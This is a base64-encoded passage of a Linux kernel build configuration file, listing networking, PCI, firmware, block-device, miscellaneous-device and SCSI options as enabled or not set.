X05FVF9TQ0hfREVGQVVMVCBpcyBub3Qgc2V0CgojCiMgQ2xhc3NpZmljYXRpb24KIwpDT05GSUdf
TkVUX0NMUz15CiMgQ09ORklHX05FVF9DTFNfQkFTSUMgaXMgbm90IHNldAojIENPTkZJR19ORVRf
Q0xTX1JPVVRFNCBpcyBub3Qgc2V0CiMgQ09ORklHX05FVF9DTFNfRlcgaXMgbm90IHNldAojIENP
TkZJR19ORVRfQ0xTX1UzMiBpcyBub3Qgc2V0CiMgQ09ORklHX05FVF9DTFNfRkxPVyBpcyBub3Qg
c2V0CkNPTkZJR19ORVRfQ0xTX0NHUk9VUD15CiMgQ09ORklHX05FVF9DTFNfQlBGIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTkVUX0NMU19GTE9XRVIgaXMgbm90IHNldAojIENPTkZJR19ORVRfQ0xTX01B
VENIQUxMIGlzIG5vdCBzZXQKQ09ORklHX05FVF9FTUFUQ0g9eQpDT05GSUdfTkVUX0VNQVRDSF9T
VEFDSz0zMgojIENPTkZJR19ORVRfRU1BVENIX0NNUCBpcyBub3Qgc2V0CiMgQ09ORklHX05FVF9F
TUFUQ0hfTkJZVEUgaXMgbm90IHNldAojIENPTkZJR19ORVRfRU1BVENIX1UzMiBpcyBub3Qgc2V0
CiMgQ09ORklHX05FVF9FTUFUQ0hfTUVUQSBpcyBub3Qgc2V0CiMgQ09ORklHX05FVF9FTUFUQ0hf
VEVYVCBpcyBub3Qgc2V0CiMgQ09ORklHX05FVF9FTUFUQ0hfSVBUIGlzIG5vdCBzZXQKQ09ORklH
X05FVF9DTFNfQUNUPXkKIyBDT05GSUdfTkVUX0FDVF9QT0xJQ0UgaXMgbm90IHNldAojIENPTkZJ
R19ORVRfQUNUX0dBQ1QgaXMgbm90IHNldAojIENPTkZJR19ORVRfQUNUX01JUlJFRCBpcyBub3Qg
c2V0CiMgQ09ORklHX05FVF9BQ1RfU0FNUExFIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0FDVF9O
QVQgaXMgbm90IHNldAojIENPTkZJR19ORVRfQUNUX1BFRElUIGlzIG5vdCBzZXQKIyBDT05GSUdf
TkVUX0FDVF9TSU1QIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0FDVF9TS0JFRElUIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTkVUX0FDVF9DU1VNIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0FDVF9NUExT
IGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0FDVF9WTEFOIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVU
X0FDVF9CUEYgaXMgbm90IHNldAojIENPTkZJR19ORVRfQUNUX1NLQk1PRCBpcyBub3Qgc2V0CiMg
Q09ORklHX05FVF9BQ1RfSUZFIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0FDVF9UVU5ORUxfS0VZ
IGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0FDVF9HQVRFIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVU
X1RDX1NLQl9FWFQgaXMgbm90IHNldApDT05GSUdfTkVUX1NDSF9GSUZPPXkKIyBDT05GSUdfRENC
IGlzIG5vdCBzZXQKQ09ORklHX0ROU19SRVNPTFZFUj15CiMgQ09ORklHX0JBVE1BTl9BRFYgaXMg
bm90IHNldAojIENPTkZJR19PUEVOVlNXSVRDSCBpcyBub3Qgc2V0CiMgQ09ORklHX1ZTT0NLRVRT
IGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUTElOS19ESUFHIGlzIG5vdCBzZXQKIyBDT05GSUdfTVBM
UyBpcyBub3Qgc2V0CiMgQ09ORklHX05FVF9OU0ggaXMgbm90IHNldAojIENPTkZJR19IU1IgaXMg
bm90IHNldAojIENPTkZJR19ORVRfU1dJVENIREVWIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0wz
X01BU1RFUl9ERVYgaXMgbm90IHNldAojIENPTkZJR19RUlRSIGlzIG5vdCBzZXQKIyBDT05GSUdf
TkVUX05DU0kgaXMgbm90IHNldApDT05GSUdfUENQVV9ERVZfUkVGQ05UPXkKQ09ORklHX01BWF9T
S0JfRlJBR1M9MTcKQ09ORklHX1JQUz15CkNPTkZJR19SRlNfQUNDRUw9eQpDT05GSUdfU09DS19S
WF9RVUVVRV9NQVBQSU5HPXkKQ09ORklHX1hQUz15CkNPTkZJR19DR1JPVVBfTkVUX1BSSU89eQpD
T05GSUdfQ0dST1VQX05FVF9DTEFTU0lEPXkKQ09ORklHX05FVF9SWF9CVVNZX1BPTEw9eQpDT05G
SUdfQlFMPXkKQ09ORklHX05FVF9GTE9XX0xJTUlUPXkKCiMKIyBOZXR3b3JrIHRlc3RpbmcKIwoj
IENPTkZJR19ORVRfUEtUR0VOIGlzIG5vdCBzZXQKIyBDT05GSUdfTkVUX0RST1BfTU9OSVRPUiBp
cyBub3Qgc2V0CiMgZW5kIG9mIE5ldHdvcmsgdGVzdGluZwojIGVuZCBvZiBOZXR3b3JraW5nIG9w
dGlvbnMKCiMgQ09ORklHX0hBTVJBRElPIGlzIG5vdCBzZXQKIyBDT05GSUdfQ0FOIGlzIG5vdCBz
ZXQKIyBDT05GSUdfQlQgaXMgbm90IHNldAojIENPTkZJR19BRl9SWFJQQyBpcyBub3Qgc2V0CiMg
Q09ORklHX0FGX0tDTSBpcyBub3Qgc2V0CiMgQ09ORklHX01DVFAgaXMgbm90IHNldApDT05GSUdf
RklCX1JVTEVTPXkKQ09ORklHX1dJUkVMRVNTPXkKQ09ORklHX0NGRzgwMjExPXkKIyBDT05GSUdf
Tkw4MDIxMV9URVNUTU9ERSBpcyBub3Qgc2V0CiMgQ09ORklHX0NGRzgwMjExX0RFVkVMT1BFUl9X
QVJOSU5HUyBpcyBub3Qgc2V0CkNPTkZJR19DRkc4MDIxMV9SRVFVSVJFX1NJR05FRF9SRUdEQj15
CkNPTkZJR19DRkc4MDIxMV9VU0VfS0VSTkVMX1JFR0RCX0tFWVM9eQpDT05GSUdfQ0ZHODAyMTFf
REVGQVVMVF9QUz15CiMgQ09ORklHX0NGRzgwMjExX0RFQlVHRlMgaXMgbm90IHNldApDT05GSUdf
Q0ZHODAyMTFfQ1JEQV9TVVBQT1JUPXkKIyBDT05GSUdfQ0ZHODAyMTFfV0VYVCBpcyBub3Qgc2V0
CkNPTkZJR19NQUM4MDIxMT15CkNPTkZJR19NQUM4MDIxMV9IQVNfUkM9eQpDT05GSUdfTUFDODAy
MTFfUkNfTUlOU1RSRUw9eQpDT05GSUdfTUFDODAyMTFfUkNfREVGQVVMVF9NSU5TVFJFTD15CkNP
TkZJR19NQUM4MDIxMV9SQ19ERUZBVUxUPSJtaW5zdHJlbF9odCIKIyBDT05GSUdfTUFDODAyMTFf
TUVTSCBpcyBub3Qgc2V0CkNPTkZJR19NQUM4MDIxMV9MRURTPXkKIyBDT05GSUdfTUFDODAyMTFf
TUVTU0FHRV9UUkFDSU5HIGlzIG5vdCBzZXQKIyBDT05GSUdfTUFDODAyMTFfREVCVUdfTUVOVSBp
cyBub3Qgc2V0CkNPTkZJR19NQUM4MDIxMV9TVEFfSEFTSF9NQVhfU0laRT0wCkNPTkZJR19SRktJ
TEw9eQpDT05GSUdfUkZLSUxMX0xFRFM9eQpDT05GSUdfUkZLSUxMX0lOUFVUPXkKQ09ORklHX05F
VF85UD15CkNPTkZJR19ORVRfOVBfRkQ9eQpDT05GSUdfTkVUXzlQX1ZJUlRJTz15CiMgQ09ORklH
X05FVF85UF9ERUJVRyBpcyBub3Qgc2V0CiMgQ09ORklHX0NBSUYgaXMgbm90IHNldAojIENPTkZJ
R19DRVBIX0xJQiBpcyBub3Qgc2V0CiMgQ09ORklHX05GQyBpcyBub3Qgc2V0CiMgQ09ORklHX1BT
QU1QTEUgaXMgbm90IHNldAojIENPTkZJR19ORVRfSUZFIGlzIG5vdCBzZXQKIyBDT05GSUdfTFdU
VU5ORUwgaXMgbm90IHNldApDT05GSUdfRFNUX0NBQ0hFPXkKQ09ORklHX0dST19DRUxMUz15CkNP
TkZJR19ORVRfU0VMRlRFU1RTPXkKQ09ORklHX05FVF9TT0NLX01TRz15CkNPTkZJR19QQUdFX1BP
T0w9eQojIENPTkZJR19QQUdFX1BPT0xfU1RBVFMgaXMgbm90IHNldApDT05GSUdfRkFJTE9WRVI9
eQpDT05GSUdfRVRIVE9PTF9ORVRMSU5LPXkKCiMKIyBEZXZpY2UgRHJpdmVycwojCkNPTkZJR19I
QVZFX0VJU0E9eQojIENPTkZJR19FSVNBIGlzIG5vdCBzZXQKQ09ORklHX0hBVkVfUENJPXkKQ09O
RklHX0dFTkVSSUNfUENJX0lPTUFQPXkKQ09ORklHX1BDST15CkNPTkZJR19QQ0lfRE9NQUlOUz15
CkNPTkZJR19QQ0lFUE9SVEJVUz15CiMgQ09ORklHX0hPVFBMVUdfUENJX1BDSUUgaXMgbm90IHNl
dAojIENPTkZJR19QQ0lFQUVSIGlzIG5vdCBzZXQKQ09ORklHX1BDSUVBU1BNPXkKQ09ORklHX1BD
SUVBU1BNX0RFRkFVTFQ9eQojIENPTkZJR19QQ0lFQVNQTV9QT1dFUlNBVkUgaXMgbm90IHNldAoj
IENPTkZJR19QQ0lFQVNQTV9QT1dFUl9TVVBFUlNBVkUgaXMgbm90IHNldAojIENPTkZJR19QQ0lF
QVNQTV9QRVJGT1JNQU5DRSBpcyBub3Qgc2V0CkNPTkZJR19QQ0lFX1BNRT15CiMgQ09ORklHX1BD
SUVfUFRNIGlzIG5vdCBzZXQKQ09ORklHX1BDSV9NU0k9eQpDT05GSUdfUENJX1FVSVJLUz15CiMg
Q09ORklHX1BDSV9ERUJVRyBpcyBub3Qgc2V0CiMgQ09ORklHX1BDSV9TVFVCIGlzIG5vdCBzZXQK
Q09ORklHX1BDSV9BVFM9eQpDT05GSUdfUENJX0xPQ0tMRVNTX0NPTkZJRz15CiMgQ09ORklHX1BD
SV9JT1YgaXMgbm90IHNldApDT05GSUdfUENJX1BSST15CkNPTkZJR19QQ0lfUEFTSUQ9eQpDT05G
SUdfUENJX0xBQkVMPXkKQ09ORklHX1ZHQV9BUkI9eQpDT05GSUdfVkdBX0FSQl9NQVhfR1BVUz0x
NgpDT05GSUdfSE9UUExVR19QQ0k9eQojIENPTkZJR19IT1RQTFVHX1BDSV9BQ1BJIGlzIG5vdCBz
ZXQKIyBDT05GSUdfSE9UUExVR19QQ0lfQ1BDSSBpcyBub3Qgc2V0CiMgQ09ORklHX0hPVFBMVUdf
UENJX1NIUEMgaXMgbm90IHNldAoKIwojIFBDSSBjb250cm9sbGVyIGRyaXZlcnMKIwojIENPTkZJ
R19WTUQgaXMgbm90IHNldAoKIwojIENhZGVuY2UtYmFzZWQgUENJZSBjb250cm9sbGVycwojCiMg
ZW5kIG9mIENhZGVuY2UtYmFzZWQgUENJZSBjb250cm9sbGVycwoKIwojIERlc2lnbldhcmUtYmFz
ZWQgUENJZSBjb250cm9sbGVycwojCiMgQ09ORklHX1BDSV9NRVNPTiBpcyBub3Qgc2V0CiMgQ09O
RklHX1BDSUVfRFdfUExBVF9IT1NUIGlzIG5vdCBzZXQKIyBlbmQgb2YgRGVzaWduV2FyZS1iYXNl
ZCBQQ0llIGNvbnRyb2xsZXJzCgojCiMgTW9iaXZlaWwtYmFzZWQgUENJZSBjb250cm9sbGVycwoj
CiMgZW5kIG9mIE1vYml2ZWlsLWJhc2VkIFBDSWUgY29udHJvbGxlcnMKCiMKIyBQTERBLWJhc2Vk
IFBDSWUgY29udHJvbGxlcnMKIwojIGVuZCBvZiBQTERBLWJhc2VkIFBDSWUgY29udHJvbGxlcnMK
IyBlbmQgb2YgUENJIGNvbnRyb2xsZXIgZHJpdmVycwoKIwojIFBDSSBFbmRwb2ludAojCiMgQ09O
RklHX1BDSV9FTkRQT0lOVCBpcyBub3Qgc2V0CiMgZW5kIG9mIFBDSSBFbmRwb2ludAoKIwojIFBD
SSBzd2l0Y2ggY29udHJvbGxlciBkcml2ZXJzCiMKIyBDT05GSUdfUENJX1NXX1NXSVRDSFRFQyBp
cyBub3Qgc2V0CiMgZW5kIG9mIFBDSSBzd2l0Y2ggY29udHJvbGxlciBkcml2ZXJzCgojIENPTkZJ
R19DWExfQlVTIGlzIG5vdCBzZXQKQ09ORklHX1BDQ0FSRD15CkNPTkZJR19QQ01DSUE9eQpDT05G
SUdfUENNQ0lBX0xPQURfQ0lTPXkKQ09ORklHX0NBUkRCVVM9eQoKIwojIFBDLWNhcmQgYnJpZGdl
cwojCkNPTkZJR19ZRU5UQT15CkNPTkZJR19ZRU5UQV9PMj15CkNPTkZJR19ZRU5UQV9SSUNPSD15
CkNPTkZJR19ZRU5UQV9UST15CkNPTkZJR19ZRU5UQV9FTkVfVFVORT15CkNPTkZJR19ZRU5UQV9U
T1NISUJBPXkKIyBDT05GSUdfUEQ2NzI5IGlzIG5vdCBzZXQKIyBDT05GSUdfSTgyMDkyIGlzIG5v
dCBzZXQKQ09ORklHX1BDQ0FSRF9OT05TVEFUSUM9eQojIENPTkZJR19SQVBJRElPIGlzIG5vdCBz
ZXQKCiMKIyBHZW5lcmljIERyaXZlciBPcHRpb25zCiMKQ09ORklHX0FVWElMSUFSWV9CVVM9eQoj
IENPTkZJR19VRVZFTlRfSEVMUEVSIGlzIG5vdCBzZXQKQ09ORklHX0RFVlRNUEZTPXkKQ09ORklH
X0RFVlRNUEZTX01PVU5UPXkKIyBDT05GSUdfREVWVE1QRlNfU0FGRSBpcyBub3Qgc2V0CkNPTkZJ
R19TVEFOREFMT05FPXkKQ09ORklHX1BSRVZFTlRfRklSTVdBUkVfQlVJTEQ9eQoKIwojIEZpcm13
YXJlIGxvYWRlcgojCkNPTkZJR19GV19MT0FERVI9eQpDT05GSUdfRVhUUkFfRklSTVdBUkU9IiIK
IyBDT05GSUdfRldfTE9BREVSX1VTRVJfSEVMUEVSIGlzIG5vdCBzZXQKIyBDT05GSUdfRldfTE9B
REVSX0NPTVBSRVNTIGlzIG5vdCBzZXQKQ09ORklHX0ZXX0NBQ0hFPXkKIyBDT05GSUdfRldfVVBM
T0FEIGlzIG5vdCBzZXQKIyBlbmQgb2YgRmlybXdhcmUgbG9hZGVyCgpDT05GSUdfQUxMT1dfREVW
X0NPUkVEVU1QPXkKIyBDT05GSUdfREVCVUdfRFJJVkVSIGlzIG5vdCBzZXQKQ09ORklHX0RFQlVH
X0RFVlJFUz15CiMgQ09ORklHX0RFQlVHX1RFU1RfRFJJVkVSX1JFTU9WRSBpcyBub3Qgc2V0CiMg
Q09ORklHX1RFU1RfQVNZTkNfRFJJVkVSX1BST0JFIGlzIG5vdCBzZXQKQ09ORklHX0dFTkVSSUNf
Q1BVX0RFVklDRVM9eQpDT05GSUdfR0VORVJJQ19DUFVfQVVUT1BST0JFPXkKQ09ORklHX0dFTkVS
SUNfQ1BVX1ZVTE5FUkFCSUxJVElFUz15CkNPTkZJR19SRUdNQVA9eQpDT05GSUdfRE1BX1NIQVJF
RF9CVUZGRVI9eQojIENPTkZJR19ETUFfRkVOQ0VfVFJBQ0UgaXMgbm90IHNldAojIENPTkZJR19G
V19ERVZMSU5LX1NZTkNfU1RBVEVfVElNRU9VVCBpcyBub3Qgc2V0CiMgZW5kIG9mIEdlbmVyaWMg
RHJpdmVyIE9wdGlvbnMKCiMKIyBCdXMgZGV2aWNlcwojCiMgQ09ORklHX01ISV9CVVMgaXMgbm90
IHNldAojIENPTkZJR19NSElfQlVTX0VQIGlzIG5vdCBzZXQKIyBlbmQgb2YgQnVzIGRldmljZXMK
CiMKIyBDYWNoZSBEcml2ZXJzCiMKIyBlbmQgb2YgQ2FjaGUgRHJpdmVycwoKQ09ORklHX0NPTk5F
Q1RPUj15CkNPTkZJR19QUk9DX0VWRU5UUz15CgojCiMgRmlybXdhcmUgRHJpdmVycwojCgojCiMg
QVJNIFN5c3RlbSBDb250cm9sIGFuZCBNYW5hZ2VtZW50IEludGVyZmFjZSBQcm90b2NvbAojCiMg
ZW5kIG9mIEFSTSBTeXN0ZW0gQ29udHJvbCBhbmQgTWFuYWdlbWVudCBJbnRlcmZhY2UgUHJvdG9j
b2wKCiMgQ09ORklHX0VERCBpcyBub3Qgc2V0CkNPTkZJR19GSVJNV0FSRV9NRU1NQVA9eQpDT05G
SUdfRE1JSUQ9eQojIENPTkZJR19ETUlfU1lTRlMgaXMgbm90IHNldApDT05GSUdfRE1JX1NDQU5f
TUFDSElORV9OT05fRUZJX0ZBTExCQUNLPXkKIyBDT05GSUdfSVNDU0lfSUJGVCBpcyBub3Qgc2V0
CiMgQ09ORklHX0ZXX0NGR19TWVNGUyBpcyBub3Qgc2V0CiMgQ09ORklHX1NZU0ZCX1NJTVBMRUZC
IGlzIG5vdCBzZXQKIyBDT05GSUdfR09PR0xFX0ZJUk1XQVJFIGlzIG5vdCBzZXQKCiMKIyBFRkkg
KEV4dGVuc2libGUgRmlybXdhcmUgSW50ZXJmYWNlKSBTdXBwb3J0CiMKQ09ORklHX0VGSV9FU1JU
PXkKQ09ORklHX0VGSV9EWEVfTUVNX0FUVFJJQlVURVM9eQpDT05GSUdfRUZJX1JVTlRJTUVfV1JB
UFBFUlM9eQojIENPTkZJR19FRklfQk9PVExPQURFUl9DT05UUk9MIGlzIG5vdCBzZXQKIyBDT05G
SUdfRUZJX0NBUFNVTEVfTE9BREVSIGlzIG5vdCBzZXQKIyBDT05GSUdfRUZJX1RFU1QgaXMgbm90
IHNldAojIENPTkZJR19BUFBMRV9QUk9QRVJUSUVTIGlzIG5vdCBzZXQKIyBDT05GSUdfUkVTRVRf
QVRUQUNLX01JVElHQVRJT04gaXMgbm90IHNldAojIENPTkZJR19FRklfUkNJMl9UQUJMRSBpcyBu
b3Qgc2V0CiMgQ09ORklHX0VGSV9ESVNBQkxFX1BDSV9ETUEgaXMgbm90IHNldApDT05GSUdfRUZJ
X0VBUkxZQ09OPXkKQ09ORklHX0VGSV9DVVNUT01fU1NEVF9PVkVSTEFZUz15CiMgQ09ORklHX0VG
SV9ESVNBQkxFX1JVTlRJTUUgaXMgbm90IHNldAojIENPTkZJR19FRklfQ09DT19TRUNSRVQgaXMg
bm90IHNldAojIGVuZCBvZiBFRkkgKEV4dGVuc2libGUgRmlybXdhcmUgSW50ZXJmYWNlKSBTdXBw
b3J0CgojCiMgUXVhbGNvbW0gZmlybXdhcmUgZHJpdmVycwojCiMgZW5kIG9mIFF1YWxjb21tIGZp
cm13YXJlIGRyaXZlcnMKCiMKIyBUZWdyYSBmaXJtd2FyZSBkcml2ZXIKIwojIGVuZCBvZiBUZWdy
YSBmaXJtd2FyZSBkcml2ZXIKIyBlbmQgb2YgRmlybXdhcmUgRHJpdmVycwoKIyBDT05GSUdfR05T
UyBpcyBub3Qgc2V0CiMgQ09ORklHX01URCBpcyBub3Qgc2V0CiMgQ09ORklHX09GIGlzIG5vdCBz
ZXQKQ09ORklHX0FSQ0hfTUlHSFRfSEFWRV9QQ19QQVJQT1JUPXkKIyBDT05GSUdfUEFSUE9SVCBp
cyBub3Qgc2V0CkNPTkZJR19QTlA9eQpDT05GSUdfUE5QX0RFQlVHX01FU1NBR0VTPXkKCiMKIyBQ
cm90b2NvbHMKIwpDT05GSUdfUE5QQUNQST15CkNPTkZJR19CTEtfREVWPXkKIyBDT05GSUdfQkxL
X0RFVl9OVUxMX0JMSyBpcyBub3Qgc2V0CiMgQ09ORklHX0JMS19ERVZfRkQgaXMgbm90IHNldApD
T05GSUdfQ0RST009eQojIENPTkZJR19CTEtfREVWX1BDSUVTU0RfTVRJUDMyWFggaXMgbm90IHNl
dAojIENPTkZJR19aUkFNIGlzIG5vdCBzZXQKQ09ORklHX0JMS19ERVZfTE9PUD15CkNPTkZJR19C
TEtfREVWX0xPT1BfTUlOX0NPVU5UPTgKIyBDT05GSUdfQkxLX0RFVl9EUkJEIGlzIG5vdCBzZXQK
IyBDT05GSUdfQkxLX0RFVl9OQkQgaXMgbm90IHNldAojIENPTkZJR19CTEtfREVWX1JBTSBpcyBu
b3Qgc2V0CiMgQ09ORklHX0NEUk9NX1BLVENEVkQgaXMgbm90IHNldAojIENPTkZJR19BVEFfT1ZF
Ul9FVEggaXMgbm90IHNldApDT05GSUdfVklSVElPX0JMSz15CiMgQ09ORklHX0JMS19ERVZfUkJE
IGlzIG5vdCBzZXQKIyBDT05GSUdfQkxLX0RFVl9VQkxLIGlzIG5vdCBzZXQKCiMKIyBOVk1FIFN1
cHBvcnQKIwojIENPTkZJR19CTEtfREVWX05WTUUgaXMgbm90IHNldAojIENPTkZJR19OVk1FX0ZD
IGlzIG5vdCBzZXQKIyBDT05GSUdfTlZNRV9UQ1AgaXMgbm90IHNldAojIENPTkZJR19OVk1FX1RB
UkdFVCBpcyBub3Qgc2V0CiMgZW5kIG9mIE5WTUUgU3VwcG9ydAoKIwojIE1pc2MgZGV2aWNlcwoj
CiMgQ09ORklHX0FENTI1WF9EUE9UIGlzIG5vdCBzZXQKIyBDT05GSUdfRFVNTVlfSVJRIGlzIG5v
dCBzZXQKIyBDT05GSUdfSUJNX0FTTSBpcyBub3Qgc2V0CiMgQ09ORklHX1BIQU5UT00gaXMgbm90
IHNldAojIENPTkZJR19USUZNX0NPUkUgaXMgbm90IHNldAojIENPTkZJR19JQ1M5MzJTNDAxIGlz
IG5vdCBzZXQKIyBDT05GSUdfRU5DTE9TVVJFX1NFUlZJQ0VTIGlzIG5vdCBzZXQKIyBDT05GSUdf
SFBfSUxPIGlzIG5vdCBzZXQKIyBDT05GSUdfQVBEUzk4MDJBTFMgaXMgbm90IHNldAojIENPTkZJ
R19JU0wyOTAwMyBpcyBub3Qgc2V0CiMgQ09ORklHX0lTTDI5MDIwIGlzIG5vdCBzZXQKIyBDT05G
SUdfU0VOU09SU19UU0wyNTUwIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19CSDE3NzAgaXMg
bm90IHNldAojIENPTkZJR19TRU5TT1JTX0FQRFM5OTBYIGlzIG5vdCBzZXQKIyBDT05GSUdfSE1D
NjM1MiBpcyBub3Qgc2V0CiMgQ09ORklHX0RTMTY4MiBpcyBub3Qgc2V0CiMgQ09ORklHX1NSQU0g
aXMgbm90IHNldAojIENPTkZJR19EV19YREFUQV9QQ0lFIGlzIG5vdCBzZXQKIyBDT05GSUdfUENJ
X0VORFBPSU5UX1RFU1QgaXMgbm90IHNldAojIENPTkZJR19YSUxJTlhfU0RGRUMgaXMgbm90IHNl
dAojIENPTkZJR19OU00gaXMgbm90IHNldAojIENPTkZJR19DMlBPUlQgaXMgbm90IHNldAoKIwoj
IEVFUFJPTSBzdXBwb3J0CiMKIyBDT05GSUdfRUVQUk9NX0FUMjQgaXMgbm90IHNldAojIENPTkZJ
R19FRVBST01fTUFYNjg3NSBpcyBub3Qgc2V0CiMgQ09ORklHX0VFUFJPTV85M0NYNiBpcyBub3Qg
c2V0CiMgQ09ORklHX0VFUFJPTV9JRFRfODlIUEVTWCBpcyBub3Qgc2V0CiMgQ09ORklHX0VFUFJP
TV9FRTEwMDQgaXMgbm90IHNldAojIGVuZCBvZiBFRVBST00gc3VwcG9ydAoKIyBDT05GSUdfQ0I3
MTBfQ09SRSBpcyBub3Qgc2V0CgojCiMgVGV4YXMgSW5zdHJ1bWVudHMgc2hhcmVkIHRyYW5zcG9y
dCBsaW5lIGRpc2NpcGxpbmUKIwojIGVuZCBvZiBUZXhhcyBJbnN0cnVtZW50cyBzaGFyZWQgdHJh
bnNwb3J0IGxpbmUgZGlzY2lwbGluZQoKIyBDT05GSUdfU0VOU09SU19MSVMzX0kyQyBpcyBub3Qg
c2V0CiMgQ09ORklHX0FMVEVSQV9TVEFQTCBpcyBub3Qgc2V0CkNPTkZJR19JTlRFTF9NRUk9eQpD
T05GSUdfSU5URUxfTUVJX01FPXkKIyBDT05GSUdfSU5URUxfTUVJX1RYRSBpcyBub3Qgc2V0CiMg
Q09ORklHX0lOVEVMX01FSV9HU0MgaXMgbm90IHNldAojIENPTkZJR19JTlRFTF9NRUlfSERDUCBp
cyBub3Qgc2V0CiMgQ09ORklHX0lOVEVMX01FSV9QWFAgaXMgbm90IHNldAojIENPTkZJR19JTlRF
TF9NRUlfR1NDX1BST1hZIGlzIG5vdCBzZXQKIyBDT05GSUdfVk1XQVJFX1ZNQ0kgaXMgbm90IHNl
dAojIENPTkZJR19HRU5XUUUgaXMgbm90IHNldAojIENPTkZJR19FQ0hPIGlzIG5vdCBzZXQKIyBD
T05GSUdfQkNNX1ZLIGlzIG5vdCBzZXQKIyBDT05GSUdfTUlTQ19BTENPUl9QQ0kgaXMgbm90IHNl
dAojIENPTkZJR19NSVNDX1JUU1hfUENJIGlzIG5vdCBzZXQKIyBDT05GSUdfTUlTQ19SVFNYX1VT
QiBpcyBub3Qgc2V0CiMgQ09ORklHX1VBQ0NFIGlzIG5vdCBzZXQKIyBDT05GSUdfUFZQQU5JQyBp
cyBub3Qgc2V0CiMgQ09ORklHX0tFQkFfQ1A1MDAgaXMgbm90IHNldAojIGVuZCBvZiBNaXNjIGRl
dmljZXMKCiMKIyBTQ1NJIGRldmljZSBzdXBwb3J0CiMKQ09ORklHX1NDU0lfTU9EPXkKIyBDT05G
SUdfUkFJRF9BVFRSUyBpcyBub3Qgc2V0CkNPTkZJR19TQ1NJX0NPTU1PTj15CkNPTkZJR19TQ1NJ
PXkKQ09ORklHX1NDU0lfRE1BPXkKQ09ORklHX1NDU0lfUFJPQ19GUz15CgojCiMgU0NTSSBzdXBw
b3J0IHR5cGUgKGRpc2ssIHRhcGUsIENELVJPTSkKIwpDT05GSUdfQkxLX0RFVl9TRD15CiMgQ09O
RklHX0NIUl9ERVZfU1QgaXMgbm90IHNldApDT05GSUdfQkxLX0RFVl9TUj15CkNPTkZJR19DSFJf
REVWX1NHPXkKQ09ORklHX0JMS19ERVZfQlNHPXkKIyBDT05GSUdfQ0hSX0RFVl9TQ0ggaXMgbm90
IHNldApDT05GSUdfU0NTSV9DT05TVEFOVFM9eQojIENPTkZJR19TQ1NJX0xPR0dJTkcgaXMgbm90
IHNldAojIENPTkZJR19TQ1NJX1NDQU5fQVNZTkMgaXMgbm90IHNldAoKIwojIFNDU0kgVHJhbnNw
b3J0cwojCkNPTkZJR19TQ1NJX1NQSV9BVFRSUz15CiMgQ09ORklHX1NDU0lfRkNfQVRUUlMgaXMg
bm90IHNldAojIENPTkZJR19TQ1NJX0lTQ1NJX0FUVFJTIGlzIG5vdCBzZXQKIyBDT05GSUdfU0NT
SV9TQVNfQVRUUlMgaXMgbm90IHNldAojIENPTkZJR19TQ1NJX1NBU19MSUJTQVMgaXMgbm90IHNl
dAojIENPTkZJR19TQ1NJX1NSUF9BVFRSUyBpcyBub3Qgc2V0CiMgZW5kIG9mIFNDU0kgVHJhbnNw
b3J0cwoKQ09ORklHX1NDU0lfTE9XTEVWRUw9eQojIENPTkZJR19JU0NTSV9UQ1AgaXMgbm90IHNl
dAojIENPTkZJR19JU0NTSV9CT09UX1NZU0ZTIGlzIG5vdCBzZXQKIyBDT05GSUdfU0NTSV9DWEdC
M19JU0NTSSBpcyBub3Qgc2V0CiMgQ09ORklHX1NDU0lfQ1hHQjRfSVNDU0kgaXMgbm90IHNldAoj
IENPTkZJR19TQ1NJX0JOWDJfSVNDU0kgaXMgbm90IHNldAojIENPTkZJR19CRTJJU0NTSSBpcyBu
b3Qgc2V0CiMgQ09ORklHX0JMS19ERVZfM1dfWFhYWF9SQUlEIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0NTSV9IUFNBIGlzIG5vdCBzZXQKIyBDT05GSUdfU0NTSV8zV185WFhYIGlzIG5vdCBzZXQKIyBD
T05GSUdfU0NTSV8zV19TQVMgaXMgbm90IHNldAojIENPTkZJR19TQ1NJX0FDQVJEIGlzIG5vdCBz
ZXQKIyBDT05GSUdfU0NTSV9BQUNSQUlEIGlzIG5vdCBzZXQKIyBDT05GSUdfU0NTSV9BSUM3WFhY
IGlzIG5vdCBzZXQKIyBDT05GSUdfU0NTSV9BSUM3OVhYIGlzIG5vdCBzZXQKIyBDT05GSUdfU0NT
SV9BSUM5NFhYIGlzIG5vdCBzZXQKIyBDT05GSUdfU0NTSV9NVlNBUyBpcyBub3Qgc2V0CiMgQ09O
RklHX1NDU0lfTVZVTUkgaXMgbm90IHNldAojIENPTkZJR19TQ1NJX0FEVkFOU1lTIGlzIG5vdCBz
ZXQKIyBDT05GSUdfU0NTSV9BUkNNU1IgaXMgbm90IHNldAojIENPTkZJR19TQ1NJX0VTQVMyUiBp
cyBub3Qgc2V0CiMgQ09ORklHX01FR0FSQUlEX05FV0dFTiBpcyBub3Qgc2V0CiMgQ09ORklHX01F
R0FSQUlEX0xFR0FDWSBpcyBub3Qgc2V0CiMgQ09ORklHX01FR0FSQUlEX1NBUyBpcyBub3Qgc2V0
CiMgQ09ORklHX1NDU0lfTVBUM1NBUyBpcyBub3Qgc2V0CiMgQ09ORklHX1NDU0lfTVBUMlNBUyBp
cyBub3Qgc2V0CiMgQ09ORklHX1NDU0lfTVBJM01SIGlzIG5vdCBzZXQKIyBDT05GSUdfU0NTSV9T
TUFSVFBRSSBpcyBub3Qgc2V0CiMgQ09ORklHX1NDU0lfSFBUSU9QIGlzIG5vdCBzZXQKIyBDT05G
SUdfU0NTSV9CVVNMT0dJQyBpcyBub3Qgc2V0CiMgQ09ORklHX1NDU0lfTVlSQiBpcyBub3Qgc2V0
CiMgQ09ORklHX1NDU0lfTVlSUyBpcyBub3Qgc2V0CiMgQ09ORklHX1ZNV0FSRV9QVlNDU0kgaXMg
bm90IHNldAojIENPTkZJR19TQ1NJX1NOSUMgaXMgbm90IHNldAojIENPTkZJR19TQ1NJX0RNWDMx
